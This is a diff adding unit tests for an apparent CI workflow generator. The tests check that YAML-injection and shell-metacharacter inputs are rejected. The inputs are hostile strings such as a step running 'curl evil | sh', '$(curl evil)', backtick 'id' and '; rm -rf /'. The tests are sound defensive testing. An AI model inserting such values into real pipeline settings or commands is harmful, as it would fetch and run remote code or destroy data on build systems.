@@ -92,6 +92,44 @@ describe("DefaultPipelineGenerationService", () => {
     expect(absoluteFs.written.size).toBe(0);
   });
 
+  it("rejects a runner path that would inject YAML and writes nothing", async () => {
+    const { service, absoluteFs } = build();
+    for (const testRunnerPath of [
+      ".testrunner\n      - run: curl evil | sh",
+      "runner with:bad", // YAML-significant ':'
+      "../escape",
+      "runner#comment",
+    ]) {
+      const settings = {
+        ...DEFAULT_SETTINGS,
+        paths: { ...DEFAULT_SETTINGS.paths, testRunnerPath },
+      };
+      const result = await service.generate({ provider: "github-actions", settings });
+      expect(result.ok, testRunnerPath).toBe(false);
+      if (!result.ok) expect(result.error.code).toBe("VALIDATION_FAILED");
+    }
+    expect(absoluteFs.written.size).toBe(0);
+  });
+
+  it("rejects shell metacharacters smuggled after a -- separator and writes nothing", async () => {
+    const { service, absoluteFs } = build();
+    for (const ciRunCommand of [
+      "npm run test:ci -- $(curl evil)",
+      "npm run test:ci -- `id`",
+      "npm run test:ci -- ; rm -rf /",
+      "npm run test:ci -- | tee /tmp/x",
+    ]) {
+      const settings = {
+        ...DEFAULT_SETTINGS,
+        runner: { ...DEFAULT_SETTINGS.runner, ciRunCommand },
+      };
+      const result = await service.generate({ provider: "github-actions", settings });
+      expect(result.ok, ciRunCommand).toBe(false);
+      if (!result.ok) expect(result.error.code).toBe("VALIDATION_FAILED");
+    }
+    expect(absoluteFs.written.size).toBe(0);
+  });
+
   it("rejects a repo-relative workflowPath outside .github/workflows and writes nothing", async () => {
     const { service, absoluteFs } = build();
     for (const workflowPath of [
